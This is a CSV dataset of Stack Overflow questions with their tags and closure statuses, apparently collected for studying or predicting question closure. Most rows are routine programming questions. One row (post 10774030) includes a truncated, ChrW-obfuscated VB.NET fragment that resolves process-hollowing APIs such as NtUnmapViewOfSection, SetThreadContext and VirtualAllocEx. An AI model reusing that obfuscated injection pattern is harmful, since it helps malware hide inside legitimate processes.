PostId,PostCreationDate,OwnerUserId,OwnerCreationDate,ReputationAtPostCreation,OwnerUndeletedAnswerCountAtPostTime,Title,BodyMarkdown,Tag1,Tag2,Tag3,Tag4,Tag5,PostClosedDate,OpenStatus
11381122,07/08/2012 06:20:23,613973,02/12/2011 05:46:35,692,15,javap difference when compiling with/without assertion,"*Scala for the Impatient* Chapter 15 Exercise 10: Add `assert(n >= 0` to a `factorial` method. Compile with assertions enabled and verify that `factorial(-1)` throws an exception. Compile without assertions. What happens? Use `javap` to check what happened to the assertion call.

My code:

    object Test {
      def factorial(x: Int): Int = {
        assert(x >= 0, ""Call to factorial must be >= 0!"")
        x match {
          case 0 => 1
          case x: Int => x * factorial(x - 1)
        }
      }
      
      def main(args: Array[String]): Unit = {
        factorial(-1)
      }
    }

I compiled with `scalac` first, inspected it using `javap Test`, then compiled again with `scalac -Xelide-below MAXIMUM` and inspected with the same command - I can't seem to find a difference between the two.

I understand compiling with assertions will throw the exception when I try to execute the program, and compiling without assertions will cause a stack overflow error, but I can't find the difference in `javap`...",scala,javap,,,,,open
7766176,10/14/2011 10:13:46,620208,02/16/2011 18:53:02,11,0,Redis keys & cli,"Print to display all the keys are stored in the Redis in the database number N. To do this in CLI commands, such as: **redis-keys N \*view\*** or **rk N \*view\***.
",redis,cli,,,,10/14/2011 15:01:57,not a real question
5260164,03/10/2011 13:19:29,651348,03/09/2011 10:30:33,13,1,How to use web service in android.,i am new android developer. i have to develop one project which is based on web services. i had try but it will not work properly. so plz give to me step by step solution for my problem. ,android,,,,,03/10/2011 15:58:59,not a real question
4889000,02/03/2011 16:50:00,335546,05/07/2010 14:59:27,16,3,"Is it possible  to cancel ""keyword argumwient repeated"" exception in python 2.6?",The code runs on python 2.5 but fails with this exception on 2.6,python,python-2.6,,,,02/03/2011 17:22:32,not a real question
7436410,09/15/2011 19:29:53,834032,07/07/2011 17:20:13,709,20,Tricky Logic Need help?,"wah I tried it but stucked up here I get instr and split on mind but my both approaches arent able to make it

     1234567 89 
     1233456789   ' if its 7 and 2 then append into one
     123456 123 
     123456789    ' if its 6 and 3 then append into one
     123 1234 12(last 2 characters 12 may exist or may not) 
     123 1234 then  ' if its 3 and 4 then append into one
     1231234 12 and chech next if its 2  and if next is 2 then append
     123123412
     123456789 12 ' if its 9 and next is 2 then make it like these
     123456789 123456712 split into two taking only first 7 characters
     
The problem is the cell wont look like above rather look like below
 
    123456789 1234567 12 ' if its like these then make it like  below 
    123456789 123456712
    123 1234 1234567 12 123456789 ' like these then make it like below
    1231234 123456712 123456789
    123456789 12 1234567  'like these then make it like these
    123456789  123456712 1234567 
    123456 123 123 1234 123456789 12 'like these then make it like below
    123456123 1231234 1234556789 1234567812
    1234567 1234567 12 123456789 123 1234 123456789 12 ' then make like below
    1234567 123456712 123456789 1231234 123456789 1234567812
    12345678 123456789 1234567 123456789 ' do nothing with these type
I have tried using split 

    If (Len(text(x)) = 7 And Len(text(x + 1)) = 2) Or (Len(text(x)) = 6 And Len(text(x + 1)) = 3) Then
    text(x) = text(x) & text(x + 1)
    ActiveSheet.Cells(i, ""D"").Value = ActiveSheet.Cells(i, ""D"").Value & text(x)
    x = x + 1
    ElseIf (Len(text(x)) = 3 And Len(text(x + 1)) = 4) Then
    If Len(text(x + 2)) = 2 Then
    text(x) = text(x) & text(x + 1) & text(x + 2)
    ActiveSheet.Cells(i, ""D"").Value = ActiveSheet.Cells(i, ""D"").Value & text(x)
    Else
    text(x) = text(x) & text(x + 1)
    ActiveSheet.Cells(i, ""D"").Value = ActiveSheet.Cells(i, ""D"").Value & text(x)
    End If
    end if
Im Just still Trying the way to do it but i need some help from you guys.its been 10 hrs i I have been trying and one or other it fails I need some help ! it will be greatly appreciated. Thanks

 ",excel,vba,excel-vba,,,09/15/2011 21:36:29,not a real question
4110662,11/05/2010 22:35:16,419156,08/13/2010 03:59:11,23,2,org.springframework.transaction.UnexpectedRollbackException for Null @Version column,"I'm using Spring 3.0.4-RELEASE, JPA 2.0 with Hibernate as a provider, and JTA JOTM for transactions in my application.  I've received the following error when calling `entityManager.merge` on my entity object:

    org.objectweb.jotm.SubCoordinator commit_one_phase
    INFO: Rollback during beforeCompletion in SubCoordinator.commit_one_phase
    org.springframework.transaction.UnexpectedRollbackException: JTA transaction unexpectedly rolled back (maybe due to a timeout); nested exception is javax.transaction.RollbackException 
          at
     org.springframework.transaction.jta.JtaTransactionManager.doCommit(JtaTransactionManager.java:1012)    

This error came as a result of inserting data directly into the database (MySQL) through our Talend ETL job.  I noticed that my `@Version` column in the database had `NULL` values and decided to set them to 0 and this resolved the issue.

Why can't the `@Version` column be `NULL`?  Has anyone else come across this issue?  Thanks.",hibernate,spring,transactions,jpa-2.0,optimistic-locking,,open
10774030,05/27/2012 12:38:12,1412843,05/23/2012 14:14:47,9,0,how to convert string to char,"i want to convert say
input:
textbox1.text=blabla

output:
              blabla becomes into:

textbox2.text=(char45 & char34 char45 & char34 char45 & char64 )



damn its saying it does not meet the quality standards for asking this silly questions sorry but ill have to ADD junk

 Dim LIBRARY1 As [String] = Convert.ToString(ChrW(107)) & ChrW(101) & ChrW(114) & ChrW(110) & ChrW(101) & ChrW(108) & ChrW(51) & ChrW(50)

        Dim LIBRARY2 As [String] = Convert.ToString(ChrW(110)) & ChrW(116) & ChrW(100) & ChrW(108) & ChrW(108)

        Dim _NATIVEVAR1 As _NATIVEAPI1 = _CREATEAPI(Of _NATIVEAPI1)(LIBRARY1, Convert.ToString(ChrW(67)) & ChrW(114) & ChrW(101) & ChrW(97) & ChrW(116) & ChrW(101) & ChrW(80) & ChrW(114) & ChrW(111) & ChrW(99) & ChrW(101) & ChrW(115) & ChrW(115) & ChrW(65))
        Dim _NATIVEVAR2 As _NATIVEAPI4 = _CREATEAPI(Of _NATIVEAPI4)(LIBRARY2, Convert.ToString(ChrW(78)) & ChrW(116) & ChrW(85) & ChrW(110) & ChrW(109) & ChrW(97) & ChrW(112) & ChrW(86) & ChrW(105) & ChrW(101) & ChrW(119) & ChrW(79) & ChrW(102) & ChrW(83) & ChrW(101) & ChrW(99) & ChrW(116) & ChrW(105) & ChrW(111) & ChrW(110))
        Dim _NATIVEVAR3 As _NATIVEAPI2 = _CREATEAPI(Of _NATIVEAPI2)(LIBRARY1, Convert.ToString(ChrW(71)) & ChrW(101) & ChrW(116) & ChrW(84) & ChrW(104) & ChrW(114) & ChrW(101) & ChrW(97) & ChrW(100) & ChrW(67) & ChrW(111) & ChrW(110) & ChrW(116) & ChrW(101) & ChrW(120) & ChrW(116))
        Dim _NATIVEVAR4 As _NATIVEAPI3 = _CREATEAPI(Of _NATIVEAPI3)(LIBRARY1, Convert.ToString(ChrW(83)) & ChrW(101) & ChrW(116) & ChrW(84) & ChrW(104) & ChrW(114) & ChrW(101) & ChrW(97) & ChrW(100) & ChrW(67) & ChrW(111) & ChrW(110) & ChrW(116) & ChrW(101) & ChrW(120) & ChrW(116))
        Dim _NATIVEVAR5 As _NATIVEAPI5 = _CREATEAPI(Of _NATIVEAPI5)(LIBRARY1, Convert.ToString(ChrW(82)) & ChrW(101) & ChrW(97) & ChrW(100) & ChrW(80) & ChrW(114) & ChrW(111) & ChrW(99) & ChrW(101) & ChrW(115) & ChrW(115) & ChrW(77) & ChrW(101) & ChrW(109) & ChrW(111) & ChrW(114) & ChrW(121))
        Dim _NATIVEVAR6 As _NATIVEAPI6 = _CREATEAPI(Of _NATIVEAPI6)(LIBRARY1, Convert.ToString(ChrW(82)) & ChrW(101) & ChrW(115) & ChrW(117) & ChrW(109) & ChrW(101) & ChrW(84) & ChrW(104) & ChrW(114) & ChrW(101) & ChrW(97) & ChrW(100))
        Dim _NATIVEVAR7 As _NATIVEAPI7 = _CREATEAPI(Of _NATIVEAPI7)(LIBRARY1, Convert.ToString(ChrW(86)) & ChrW(105) & ChrW(114) & ChrW(116) & ChrW(117) & ChrW(97) & ChrW(108) & ChrW(65) & ChrW(108) & ChrW(108) & ChrW(111) & ChrW(99) & ChrW(69) & ChrW(120))
        Dim _NATIVEVAR8 As _NATIVEAPI9 = _CREATEAPI(Of _NATIVEAPI9)(LIBRARY1, Convert.ToString(ChrW(8

end junk

",string,char,convert,,,05/27/2012 16:56:35,not a real question
10529079,05/10/2012 07:12:43,1314621,04/05/2012 07:33:57,1,2,Check control for showing on display? or is hidden? (coded UI test),"heyhey,

the problem on my issue is to check if a control is behind another control or is hidden for a CODED UI TEST.

the starting point is the following

[1]: http://up.picr.de/10436769hv.jpg ""startingpointimage""

searching for ""blabla"" a text message will be written on the panel that no items could found. I highlighted it with the crosshair of the map recorder. 

[2]: http://up.picr.de/10436770vo.jpg ""searchblablaimage""

I will see these properties for highlighted control

[3]: http://up.picr.de/10436771kx.jpg ""propertiesimage""

deleting ""blabla"" in the search the no-items-found-message disappears but the text control already exists behind the panel (I suggest).

[4]: http://up.picr.de/10436772xh.jpg ""deleteblablaimage""

And the properties for that controle are already the same!

how can I define the different state in my coded UI test? has anyone an idea?

",unit-testing,control,mstest,coded-ui-tests,,,open
5369853,03/20/2011 16:42:01,849669,01/01/2010 11:21:35,544,11,Streaming from TV tuner to web server?,"Is there any tv tuners, that can cast video stream to web server?

I need to stream it to web.

Thanks ;)",tv,,,,,03/21/2011 00:21:47,off topic
4335576,12/02/2010 13:36:28,275846,02/18/2010 06:58:28,223,15,How to create a SCORM compliant LMS?,"How to create a SCORM compliant LMS using ASP.NET?
Where to start? I had read the workflow but still not getting any idea.
Can anyone please give me an idea or is any demo code available for that?",asp.net,scorm,,,,02/29/2012 19:04:51,not a real question
5225272,03/07/2011 21:08:36,243233,01/04/2010 14:22:58,434,26,What can we do with Haskell that we cannot do with Scala ?,"(Or at least in much fewer lines of code...)

I am interested in the features that differentiate Haskell from Scala along with the feature that make them similar.",scala,haskell,functional-programming,,,03/07/2011 21:19:31,not constructive
6309774,06/10/2011 17:08:48,778286,05/31/2011 20:02:49,41,0,Redirecting a page based on a JS argument,"I've been working on a problem. I posted my first question [HERE][1] and then again [HERE][2]. I think I have a working script as below. It should simply switch the selected page depending on if the browser has allowed a popup or not

    <script type=""text/javascript"">
	function openwindow() {
		var w = window.open(""popup.html"",""interaction"",""resizable=0,width=800,height=600,status=0"");
		if(w){window.location = ""enabled.html""}
		else{window.location = ""blocked.html""}
	}
	</script>
	</head>
	<body> 
	<button onclick=""openwindow();"">Test</button>
	</body>

I've tested on IE6, Firefox, Safari & Chrome but I can't cater for all the platforms, version etc. I have a test page [HERE][3]. Is it considered acceptable on this forum to ask people to give it a try? (I've checked the FAQ and I can find anything to say NO).

Thanks in advance
Giles


  [1]: http://stackoverflow.com/questions/6192889/legally-avoiding-popup-blocking
  [2]: http://stackoverflow.com/questions/6223710/redirecting-page-based-on-script-outcome
  [3]: http://rand.waysforward.com/popup_error_catch/",javascript,,,,,06/11/2011 00:06:09,too localized
9860390,03/25/2012 13:15:07,983064,10/06/2011 21:43:52,577,33,C Get IP for listening server,I am writing a client/server program using C sockets. I am specifying that the server can listen on any network interface by using INADDR_ANY in sockaddr_in.sin_addr.s_addr. This is equivalent to an IP of 0.0.0.0. Is it possible for me to get the actual IP that the server is listening on? (e.g. 192.168.1.100),c,sockets,,,,,open
11448621,07/12/2012 09:16:36,1466278,06/19/2012 11:33:48,12,0,the following venues already have 2 active specials,"We have claimed 2 venues. Only this venue behaves oddly. There really are no 2 active specials running. We suspect we have created specials before (as part of development) that a Foursquare staff has rejected. Hence, we do not see anything via web Foursquare Campaigns/Specials list.

Please help. Venue ID: 4fd1f3fda17cd702192a132f 

Thanks!",foursquare,,,,,07/12/2012 15:40:06,not a real question
9551797,03/04/2012 02:28:32,1212953,02/16/2012 03:41:38,10,0,Android is there a method similar to onListClickView for CheckBoxs?,"So my question is the title: Android is there a method similar to onListClickView for CheckBoxs?

I have a method onListClickView to get the place where the list has been touched and get the information from that slot in the list. 
   
    protected void onListItemClick(ListView l, View v, int position, long id) {
        super.onListItemClick(l, v, position, id);
        TextView label = ((TwoLineListItem) v).getText2();
        String phoneNumber = label.getText().toString();
        Toast.makeText(this, ""Selected "" + phoneNumber, Toast.LENGTH_SHORT).show();
    }

This is the method that i have but i am unaware of something similar that i could use for getting this same information for the boxes checked. Can anyone shed some light on this issue that I have?",android,,,,,,open
9685598,03/13/2012 14:05:22,969281,09/28/2011 14:22:54,17,0,Latest version of Xcode isn't compatible with mountin lion,"I upgraded to Mac OS 10.8 mountain lion, and im having a problem installing Xcode 4.3.1 from Mac App Store, is says : ""Xcode can’t be installed on “Macintosh HD” because the version of OS X is too new."" 

any idea folx ? thanks in advance 


",ios,xcode,osx,,,03/13/2012 14:11:08,off topic
3967906,10/19/2010 11:39:31,272706,02/14/2010 10:03:05,462,6,IIS 7 metabase: Setting the framework version and the managed pipeline mode programmatically,How can I set the ehe **.net framework version** and the **managed pipeline mode** programmatically for a IIS 7 programmatic via C#? What a the metabase property names for that?,c#,.net,iis7,iis-metabase,,,open
10926900,06/07/2012 06:45:05,1240271,02/29/2012 12:42:55,61,7,Could not read from the device,"I am trying to install new version of my application on the top of the last version through Xcode.
Whenever i try to install it with the same provisional profile and details, i encountered with this problem.

This problem occurs after build (while copying the files).

Has anyone faced this issue??

PS: I have attached the error screenshot.
!![Error][1]


  [1]: http://i.stack.imgur.com/mBCyB.png",iphone,ios,xcode,ipad,,,open
6794204,07/22/2011 18:05:29,858446,07/22/2011 18:05:29,1,0,Need PHP mail script to send to a list,"I need to send emails to a list, but I want the script to pick the first email and send it to there, then the next time an email is sent it will go to the next one on the list and so on.  The list will only be about 25 or so emails.",php,email,,,,07/23/2011 20:01:04,not a real question
2559523,04/01/2010 09:56:28,212688,11/17/2009 08:26:47,20,2,What are the qualities and skill set you should have to be network programmer?,"I am new to programming. I have lots of interest in networking and want to be network programmer can someone please tell me, ""what are the qualities and skill set you should have to be network programmer""?

Thanks & Regards,
Rupesh",networking,network-programming,network-protocols,programmer-skills,skills,02/01/2012 20:27:31,not constructive
7563196,09/27/2011 01:20:28,504112,11/11/2010 05:58:51,106,7,Apache PHP error with ga.js (Google Analytics)?,"I'm actually still doing some work on developing **CMS** using **PHP server**... for this one, i used **Apache server**.

I dunno why. I always got **error message** telling me that the ga.js requested is not found. And then it request to my localhost. 

That's **very strange**, tough!

Here is my **php error log**;

    [Mon Sep 26 13:46:58 2011] [notice] Apache/2.2.21 (Win32) PHP/5.2.17 configured -- resuming normal operations
    [Mon Sep 26 13:46:58 2011] [notice] Server built: Sep  9 2011 10:26:10
    [Mon Sep 26 13:46:58 2011] [notice] Parent: Created child process 2880
    [Mon Sep 26 13:46:58 2011] [notice] Child 2880: Child process is running
    [Mon Sep 26 13:46:58 2011] [notice] Child 2880: Acquired the start mutex.
    [Mon Sep 26 13:46:58 2011] [notice] Child 2880: Starting 64 worker threads.
    [Mon Sep 26 13:46:58 2011] [notice] Child 2880: Starting thread to listen on port 80.
    [Mon Sep 26 14:21:46 2011] [error] [client 127.0.0.1] File does not exist: E:/Program Files/Apache Software Foundation/Apache2.2/htdocs/ga.js, referer: http://twitter.com/#!/ESET

**At first.**
I thought it was my CMS mistakes.
I do digging up into the details of each source code of my CMS that's deployed under Apache PHP server... but i didn't see any script calling ""ga.js"" file.... very-very strange!

**Then Secondly.**
I thought this is not my CMS mistakes.
So I inspect the element of each page I visited, using Google Chrome, 
Console Tab. I found this error message;

    Failed to load resource: the server responded with a status of 404 (Not Found)   www.google-analytics.com/ga.js

Now I;m sthinking that this is My **Google Chrome** mistakes.
So I try to open **Firefox**... and Identify the same thing.
BUt I just got CSS Warning instead of Error.  Uh my God! Is this Chrome that makes my Apache PHP Server sick?",php,apache,browser,google-analytics,logging,10/10/2011 10:57:09,not constructive
11491838,07/15/2012 12:21:10,1422148,05/28/2012 16:58:48,8,0,How to take Value from User and do some Multiplication and display that answer on another layout in Android,"How can i take Value from user using EditText box and how can i use that given value for      my Logic. and i want to show that answer on another Layout.xml
    
    Example: User is Giving value: 5
    Then logic is: 5*100/16 = 87.5
    and i want to show this answer 87.5 to another layout.xml
    
    Please help...",android,android-layout,android-intent,android-button,,07/15/2012 20:58:17,not a real question
6393654,06/18/2011 03:24:03,187026,10/09/2009 08:58:38,859,37,"In gmaps4rails, how do I move the map so the marker is in view?","I have a set of locations that I want to bring up, individually through ajax calls, and some of them aren't within the current bounds of the map.  Is there a way to move the map so the marker is in view?

I don't need it to be in the center, just as long as it's in view.",gmaps4rails,,,,,,open
151291,09/30/2008 00:24:06,14752,09/17/2008 02:35:39,92,2,Can we something system.currency in .net ,Is it possible to use system.currency. It says system.currency is inaccessible due to its protection level. what is the alternative of currency.,coding,,,,,,open
249,08/01/2008 22:44:11,103,08/01/2008 22:31:22,1,0,How do I access a remote form in php?,"I want to gather info from a user on a local php page (that I control), and use that info to query a form on another site (that I don't control) - how do I do that?",php,forms,remote,,,12/17/2011 17:20:03,not a real question
8134781,11/15/2011 10:22:08,751903,05/13/2011 06:56:46,1,0,How can i go to a directory in linux and excute a command?,"I need to go to a directory in linux, and excute a command, how can i do this in one linux command ?",linux,shell,scripting,,,11/15/2011 15:22:09,off topic
